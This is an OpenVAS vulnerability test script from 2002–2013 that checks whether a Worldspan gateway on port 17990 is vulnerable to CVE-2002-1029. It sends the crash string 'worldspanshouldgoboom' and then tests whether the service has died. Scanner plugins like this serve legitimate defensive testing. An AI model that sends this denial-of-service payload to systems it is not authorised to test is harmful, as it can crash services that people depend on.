# OpenVAS Vulnerability Test
# $Id: worldspan_gw_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Worldspan gateway DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>, starting 
# from quake3_dos.nasl and a proof of concept code 
# by <altomo@digitalgangsters.net>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the 
Worldspan gateway by sending illegal data.

A cracker may use this attack to make this service 
crash continuously, preventing you from working.";

tag_solution = "upgrade your software";

# References:
# From: "altomo" <altomo@digitalgangsters.net>
# To: bugtraq@securityfocus.com
# Subject: Worldspan DoS
# Date: Thu, 4 Jul 2002 15:22:11 -0500

if(description)
{
 script_id(11049);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5169);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2002-1029");
 name = "Worldspan gateway DOS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Wordlspan DoS";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";

 script_family(family);
 script_require_ports(17990);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# I suspect that the service will be killed by find_service.nasl before
# this script can do anything...
#

port = 17990;
s = string("worldspanshouldgoboom\r");

if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (!soc) exit(0);

send(socket:soc, data:s);
close(soc);
# According to the advisory, Worldspan eats CPU and crashes after ~ 1 min
sleep(60);
soc = open_sock_tcp(port);
if (! soc)
{
 security_warning(port);
}
if (soc) close(soc);
